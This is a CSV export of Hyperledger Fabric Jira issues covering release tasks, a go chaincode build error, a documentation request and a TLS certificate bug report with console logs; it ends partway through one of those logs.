Release fabric-samples,FAB-17083,43336,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,15/Nov/19 4:28 AM,16/Nov/19 4:09 AM,28/Oct/23 3:09 AM,16/Nov/19 4:09 AM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"Update version references in fabric-samples, and then tag fabric-samples and create release-1.4 branch.

See associated CR for updates.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014p7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Pin fabric-samples to node.js ""~1.4.0""",FAB-17084,43337,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,15/Nov/19 4:28 AM,16/Nov/19 12:05 AM,28/Oct/23 3:09 AM,16/Nov/19 12:05 AM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"*AFTER V1.4.0 ONLY... NOT AFTER V1.4.0-RC1.*

After creating release-1.4 branch, pin the fabric samples to use version ""~1.4.0"" of node sdk and node chaincode.  This will forever align fabric samples in release-1.4 branch with the 1.4.x node.js releases. 

fabric-samples master branch continues to use ""unstable"" to pick up the latest and greatest node.js releases.

This should be merged in release-1.4 branch, before fabric-samples is tagged with ""v1.4.0"".

 

*Clarification - for v1.4.0-rc1 node sdk had a release, therefore we pinned at ""1.4.0-rc1"" until final release.*",,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014pf:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Tag all repositories for release,FAB-17085,43338,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,16/Nov/19 4:09 AM,28/Oct/23 3:09 AM,16/Nov/19 4:09 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"*NOTE:* depends on preceding related CRs being merged.

Tag each repository local clone with the release_notes/v1.2.0.txt as the tag comment

% git tag -a v1.4.0-rc1 -F release_notes/v1.4.0-rc1.txt

{{% git push origin v1.4.0-rc1 HEAD:refs/heads/master}}

Tag each of fabric, fabric-ca , fabric-chaincode-java, fabric-chaincode-node, fabric-sdk-node, fabric-samples (use v1.4.0-rc1).

 
----
Note, that one can also tag the repo at a specific commit-level.

NOTE *e4b4704 should be updated with latest commit sha*

E.g., to add the {color:#f79232}*v1.4.0-rc1*{color} tag at commit level {color:#205081}*e4b4704*{color}, I used

{{% git tag -a *{color:#f79232}v1.4.0-rc1{color} {color:#205081}e4b4704{color}* -}}F release_notes/v1.4.0-rc1.{{txt}}

 

 ",,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014pn:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric master references for release,FAB-17086,43339,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,15/Nov/19 4:28 AM,21/Nov/19 4:53 PM,28/Oct/23 3:09 AM,21/Nov/19 4:53 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014pv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test download of release artifacts and samples across all platforms,FAB-17087,43340,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,16/Nov/19 4:09 AM,28/Oct/23 3:09 AM,16/Nov/19 4:09 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,test download of release artifacts and samples across all platforms,,ChristopherFerris,denyeart,harrijk,rameshthoomu,vijaypunugubati,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014q3:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,harrijk,rameshthoomu,vijaypunugubati,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Verify doc build status on ReadTheDocs,FAB-17088,43341,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,rameshthoomu,denyeart,15/Nov/19 4:28 AM,16/Nov/19 12:05 AM,28/Oct/23 3:09 AM,16/Nov/19 12:05 AM,,,,,,,,,,,,,,fabric-ci,fabric-docs,fabric-release,,,,,,,0,,,,,,Verify readthedocs version release-1.4 gets built and published from release-1.4 branch edits.,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014qb:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Send email to hyperledger-fabric mailing list,FAB-17089,43342,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,16/Nov/19 4:53 AM,28/Oct/23 3:09 AM,16/Nov/19 4:53 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,send email announcing the release to hyperledger-fabric@lists.hyperledger.org mailing list.,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014qj:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Switch bootstrap.sh script binary downloads from Nexus to Github,FAB-17092,43349,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,denyeart,denyeart,16/Nov/19 12:24 AM,16/Nov/19 4:24 AM,28/Oct/23 3:09 AM,16/Nov/19 4:05 AM,,,,,,,,,,v1.4.4,v2.0.0,,,,,,,,,,,,0,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17094,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014s3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add a basic test that confirms expected proto types get decorated.,FAB-17093,43350,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,jyellick,jyellick,16/Nov/19 2:58 AM,26/Feb/20 12:18 AM,28/Oct/23 3:09 AM,26/Feb/20 12:18 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"Per https://gerrit.hyperledger.org/r/c/fabric/+/34401#message-eccb8901_793a8c92

The protolator decoration stuff https://github.com/hyperledger/fabric/blob/33139a966bb75377f65c5d9dc990619bd80ca22d/common/tools/protolator/protoext/decorate.go is currently missing any sort of tests.

Some changes would be caught by integration tests, but a more  basic level of unit testing, ensuring that we are not accidentally omiting decoration of a type we intend to decorate would be nice.",,caod,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzg",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,jyellick,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Feb/20 2:20 AM;caod;[https://github.com/hyperledger/fabric/pull/706];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Post all prior Fabric release binaries to Github releases,FAB-17094,43351,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,denyeart,denyeart,16/Nov/19 4:23 AM,02/Dec/19 11:56 AM,28/Oct/23 3:09 AM,02/Dec/19 11:56 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"Fabric release binaries have historically been published to Nexus.

Starting with v1.4.4 all release binaries will be published to Github.

Prior release binaries need to be published to Github for consistency and to ensure that download scripts such as bootstap.sh (which has been switched to pull binaries from Github) continue to work for prior releases.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17069,,,FAB-17092,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014sj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Nov/19 4:25 AM;denyeart;FYI [~btl5037] [~vijaypunugubati] [~rameshthoomu];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pretty print peer identities in gossip,FAB-17095,43353,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,16/Nov/19 8:25 AM,19/Nov/19 12:55 AM,28/Oct/23 3:09 AM,19/Nov/19 12:55 AM,,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014sz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Nov/19 8:26 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/fabric/+/34415/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update prerequisites doc,FAB-17097,43356,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,dattevelt,dattevelt,dattevelt,18/Nov/19 2:27 AM,21/Nov/19 4:54 AM,28/Oct/23 3:09 AM,21/Nov/19 4:54 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"When following the instruction on the prerequisites page of the fabric projects ([https://hyperledger-fabric.readthedocs.io/en/master/prereqs.html]), I ran into a couple of snags. They mostly occurred when running the curl script to install examples.

The script would break on multiple occasions because either a dependency was not installed or not running. Most notably git not being installed, and docker not running.

Most of the time a dev will work their way through fixing the issues and make it work, but imho it's a bit sloppy to let this situation exist.

 

I propose to update the documentation in such a way that all requirements are met to make the curl script working.

As I'm new to the project, I could use some help classifying this issue under the right components/epic",,dattevelt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014tn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dattevelt,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode install of unvendored go chaincode fails with confusing error message,FAB-17098,43357,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,denyeart,denyeart,18/Nov/19 2:45 AM,26/Apr/20 1:38 PM,28/Oct/23 3:09 AM,26/Apr/20 1:38 PM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"If your go chaincode uses modules but you do not vendor your go chaincode, upon chaincode install you get an error that is not obvious:

 
{code:java}
2019-11-17 12:26:13.609 EST [chaincode.platform.util] DockerBuild -> DEBU 155 Attempting build with image hyperledger/fabric-ccenv:2.0.0
2019-11-17 12:26:23.041 EST [chaincode.platform] func1 -> ERRO 156 docker build failed: Error returned from build: 1 ""go: finding golang.org/x/sys v0.0.0-20190813064441-fde4db37ae7a
Fetching https://proxy.golang.org/golang.org/x/sys/@v/v0.0.0-20190813064441-fde4db37ae7a.info
go: finding golang.org/x/net v0.0.0-20190813141303-74dc4d7220e7
...
Fetching https://proxy.golang.org/golang.org/x/text/@v/v0.3.2.zip
go: extracting golang.org/x/text v0.3.2
go: extracting google.golang.org/genproto v0.0.0-20190819201941-24fa4b261c55
go: updates to go.mod needed, disabled by -mod=readonly
{code}
 

Since we can expect people to hit this problem, we'll need a more instructive error message.

 

 ",,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014tv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Mar/20 1:39 AM;sykesm;[~denyeart] Do you have suggestions on the message? What was provided was the exact output of {{go build -v -mod=readonly ...}}. This boils down a build failure as the {{go.mod}} file included in the chaincode is stale or incomplete implying that the source used at development time will not be the same as the code built on the server.

From my perspective, if we don't care about building with exact package versions listed in {{go.mod}}, we can remove {{-mod=readonly}} from the build.

If it makes you feel better, you're not alone: https://github.com/golang/go/issues/29118;;;","26/Apr/20 1:37 PM;denyeart;I think we should honor the chaincode's go.mod and keep {{-mod=readonly}}. Therefore I'll close and hope that the error message is eventually improved in [https://github.com/golang/go/issues/29118];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
failed to load config for OrdererClient: unable to load orderer.tls.rootcert.file: open,FAB-17099,43358,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,pvrbharg,pvrbharg,18/Nov/19 4:31 AM,04/Jan/20 8:27 PM,28/Oct/23 3:09 AM,04/Jan/20 8:27 PM,v1.4.4,,,,,,,,,v1.4.4,,,,fabric-release,,,,,,,,,0,failure,,,,,Error: failed to create deliver client: failed to load config for OrdererClient: unable to load orderer.tls.rootcert.file: open /etc/hyperledger/fabric/cryptogen/ordererOrganizations/orderer.net/tlsca/tlsca.orderer.net-cert.pem: no such file or directory,,mastersingh24,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Nov/19 4:50 AM;pvrbharg;2019-11-17_11-48-27.png;https://jira.hyperledger.org/secure/attachment/17939/2019-11-17_11-48-27.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014u3:",,,,Unset,Unset,,"Follow the usage instructions of cluster sample in fabric repo for v1.4.4
make  compose TLS=true RELEASE=amd64-1.4.4
./build/compose-up.sh",,Unset,,,,,,Unset,,Unset,,(Please add usage information),mastersingh24,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Nov/19 4:53 AM;pvrbharg;


=============
CONSOLE OUTPUT:
=============
hlbcadmin@ubuntu:~/go/src/github.com/hyperledger/fabric/examples/cluster$ make clean
rm -rf build
rm mychannel.block
rm: cannot remove 'mychannel.block': No such file or directory
Makefile:139: recipe for target 'clean' failed
make: [clean] Error 1 (ignored)
hlbcadmin@ubuntu:~/go/src/github.com/hyperledger/fabric/examples/cluster$ make compose TLS=true RELEASE=amd64-1.4.4
GOBIN=/home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/bin go install github.com/hyperledger/fabric/common/tools/cryptogen
build/bin/cryptogen generate --config config/cryptogen.yaml --output build/cryptogen
org1.net
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer1.org1.net/* build/nodes/peer1
cp config/configtx.yaml build/nodes/peer1/configtx.yaml
cp config/core.yaml build/nodes/peer1/core.yaml
Built build/nodes/peer1
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer2.org1.net/* build/nodes/peer2
cp config/configtx.yaml build/nodes/peer2/configtx.yaml
cp config/core.yaml build/nodes/peer2/core.yaml
Built build/nodes/peer2
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer3.org1.net/* build/nodes/peer3
cp config/configtx.yaml build/nodes/peer3/configtx.yaml
cp config/core.yaml build/nodes/peer3/core.yaml
Built build/nodes/peer3
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer4.org1.net/* build/nodes/peer4
cp config/configtx.yaml build/nodes/peer4/configtx.yaml
cp config/core.yaml build/nodes/peer4/core.yaml
Built build/nodes/peer4
cp config/orderer.yaml build/nodes/orderer/orderer.yaml
cp config/configtx.yaml build/configtx.yaml
cp config/core.yaml build/core.yaml
GOBIN=/home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/bin go install github.com/hyperledger/fabric/common/tools/configtxgen
FABRIC_CFG_PATH=build build/bin/configtxgen -profile SampleOrg -outputBlock build/nodes/orderer/genesis.block
2019-11-17 19:45:19.013 UTC [common.tools.configtxgen] main -> WARN 001 Omitting the channel ID for configtxgen for output operations is deprecated. Explicitly passing the channel ID will be required in the future, defaulting to 'testchainid'.
2019-11-17 19:45:19.013 UTC [common.tools.configtxgen] main -> INFO 002 Loading configuration
2019-11-17 19:45:19.015 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: solo
2019-11-17 19:45:19.015 UTC [common.tools.configtxgen.localconfig] Load -> INFO 004 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:45:19.017 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 005 orderer type: solo
2019-11-17 19:45:19.017 UTC [common.tools.configtxgen.localconfig] LoadTopLevel -> INFO 006 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:45:19.017 UTC [common.tools.configtxgen.encoder] NewChannelGroup -> WARN 007 Default policy emission is deprecated, please include policy specifications for the channel group in configtx.yaml
2019-11-17 19:45:19.017 UTC [common.tools.configtxgen.encoder] NewOrdererGroup -> WARN 008 Default policy emission is deprecated, please include policy specifications for the orderer group in configtx.yaml
2019-11-17 19:45:19.017 UTC [common.tools.configtxgen.encoder] NewOrdererOrgGroup -> WARN 009 Default policy emission is deprecated, please include policy specifications for the orderer org group OrdererOrg in configtx.yaml
2019-11-17 19:45:19.018 UTC [common.tools.configtxgen.encoder] NewConsortiumOrgGroup -> WARN 00a Default policy emission is deprecated, please include policy specifications for the orderer org group OrdererOrg in configtx.yaml
2019-11-17 19:45:19.018 UTC [common.tools.configtxgen.encoder] NewConsortiumOrgGroup -> WARN 00b Default policy emission is deprecated, please include policy specifications for the orderer org group Org1MSP in configtx.yaml
2019-11-17 19:45:19.018 UTC [common.tools.configtxgen] doOutputBlock -> INFO 00c Generating genesis block
2019-11-17 19:45:19.018 UTC [common.tools.configtxgen] doOutputBlock -> INFO 00d Writing genesis block
cp -R build/cryptogen/ordererOrganizations/orderer.net/orderers/orderer.orderer.net/* build/nodes/orderer
cp config/configtx.yaml build/nodes/orderer/configtx.yaml
cp config/core.yaml build/nodes/orderer/core.yaml
Built build/nodes/orderer
FABRIC_CFG_PATH=build build/bin/configtxgen -profile SampleChannel \
 -channelID mychannel \
 -outputCreateChannelTx build/channel.tx
2019-11-17 19:45:19.057 UTC [common.tools.configtxgen] main -> INFO 001 Loading configuration
2019-11-17 19:45:19.059 UTC [common.tools.configtxgen.localconfig] Load -> INFO 002 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:45:19.061 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: solo
2019-11-17 19:45:19.061 UTC [common.tools.configtxgen.localconfig] LoadTopLevel -> INFO 004 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:45:19.061 UTC [common.tools.configtxgen] doOutputChannelCreateTx -> INFO 005 Generating new channel configtx
2019-11-17 19:45:19.061 UTC [common.tools.configtxgen.encoder] NewChannelGroup -> WARN 006 Default policy emission is deprecated, please include policy specifications for the channel group in configtx.yaml
2019-11-17 19:45:19.062 UTC [common.tools.configtxgen.encoder] NewApplicationGroup -> WARN 007 Default policy emission is deprecated, please include policy specifications for the application group in configtx.yaml
2019-11-17 19:45:19.062 UTC [common.tools.configtxgen.encoder] NewApplicationOrgGroup -> WARN 008 Default policy emission is deprecated, please include policy specifications for the application org group Org1MSP in configtx.yaml
2019-11-17 19:45:19.062 UTC [common.tools.configtxgen.encoder] NewChannelGroup -> WARN 009 Default policy emission is deprecated, please include policy specifications for the channel group in configtx.yaml
2019-11-17 19:45:19.062 UTC [common.tools.configtxgen.encoder] NewApplicationGroup -> WARN 00a Default policy emission is deprecated, please include policy specifications for the application group in configtx.yaml
2019-11-17 19:45:19.062 UTC [common.tools.configtxgen.encoder] NewApplicationOrgGroup -> WARN 00b Default policy emission is deprecated, please include policy specifications for the application org group Org1MSP in configtx.yaml
2019-11-17 19:45:19.063 UTC [common.tools.configtxgen] doOutputChannelCreateTx -> INFO 00c Writing new channel tx
FABRIC_CFG_PATH=build build/bin/configtxgen -profile SampleChannel \
 -channelID mychannel \
 -outputAnchorPeersUpdate build/anchor.tx \
 -asOrg Org1MSP
2019-11-17 19:45:19.089 UTC [common.tools.configtxgen] main -> INFO 001 Loading configuration
2019-11-17 19:45:19.092 UTC [common.tools.configtxgen.localconfig] Load -> INFO 002 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:45:19.093 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: solo
2019-11-17 19:45:19.093 UTC [common.tools.configtxgen.localconfig] LoadTopLevel -> INFO 004 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:45:19.093 UTC [common.tools.configtxgen] doOutputAnchorPeersUpdate -> INFO 005 Generating anchor peer update
2019-11-17 19:45:19.093 UTC [common.tools.configtxgen] doOutputAnchorPeersUpdate -> INFO 006 Writing anchor peer update
cp -R build/cryptogen/peerOrganizations/org1.net/users/Admin@org1.net/* build/nodes/cli
cp config/configtx.yaml build/nodes/cli/configtx.yaml
cp config/core.yaml build/nodes/cli/core.yaml
Built build/nodes/cli
cp config/fabric-ca-server-config.yaml build/nodes/ca/fabric-ca-server-config.yaml
cp build/cryptogen/peerOrganizations/org1.net/ca/*_sk build/nodes/ca/ca.key
cp build/cryptogen/peerOrganizations/org1.net/ca/*.pem build/nodes/ca/ca.crt
cp config/fabric-tlsca-server-config.yaml build/nodes/tlsca/fabric-tlsca-server-config.yaml
cp build/cryptogen/peerOrganizations/org1.net/tlsca/*_sk build/nodes/tlsca/ca.key
cp build/cryptogen/peerOrganizations/org1.net/tlsca/*.pem build/nodes/tlsca/ca.crt
mv build/nodes/tlsca/fabric-tlsca-server-config.yaml build/nodes/tlsca/fabric-ca-server-config.yaml
cat compose/docker-compose.yaml.in \
 | sed -e 's/_TLS_ENABLED_/true/g' \
 | sed -e 's/_DOCKER_NS_/hyperledger/g' \
 | sed -e 's/_CA_RELEASE_/amd64-1.4.4/g' \
 | sed -e 's/_COUCH_RELEASE_/amd64-1.4.4/g' \
 | sed -e 's/_FABRIC_RELEASE_/amd64-1.4.4/g' \
 > build/docker-compose.yaml
cat compose/compose-up.sh.in \
 | sed -e 's/_COMPOSE_DAEMONS_/peer1 peer2 peer3 peer4 orderer ca tlsca/g' \
 | sed -e 's/_COMPOSE_CHANNEL_NAME_/mychannel/g' \
 | sed -e 's/_COMPOSE_PEERS_/peer1 peer2 peer3 peer4/g' \
 | sed -e 's/_COMPOSE_NODES_/peer1 peer2 peer3 peer4 orderer cli ca tlsca/g' \
 | sed -e 's/_COMPOSE_TLS_/true/g' \
 > build/compose-up.sh
chmod +x build/compose-up.sh
cp compose/configure.sh.in build/configure.sh
Build complete: run 'build/compose-up.sh'
hlbcadmin@ubuntu:~/go/src/github.com/hyperledger/fabric/examples/cluster$ ./build/compose-up.sh
========================================================================
Launching Hyperledger Cluster via docker-compose
========================================================================
Creating couchdb1 ... done
Creating couchdb3 ... done
Creating couchdb4 ... done
Creating couchdb2 ... done
Creating tlsca ... done
Creating ca ... done
Creating orderer ... done
Creating peer1 ... done
Creating peer2 ... done
Creating peer3 ... done
Creating peer4 ... done
========================================================================
Configuring cluster
========================================================================
Starting couchdb1 ... done
Starting ca ... done
Starting orderer ... done
Starting peer1 ... done
+ set -e
+ CHANNEL_NAME=mychannel
+ CHANNEL_TXNS='channel.tx anchor.tx'
+ PEERS='peer1 peer2 peer3 peer4'
+ TLS_ENABLED=true
+ CA_CRT=cryptogen/ordererOrganizations/orderer.net/tlsca/tlsca.orderer.net-cert.pem
+ '[' true == true ']'
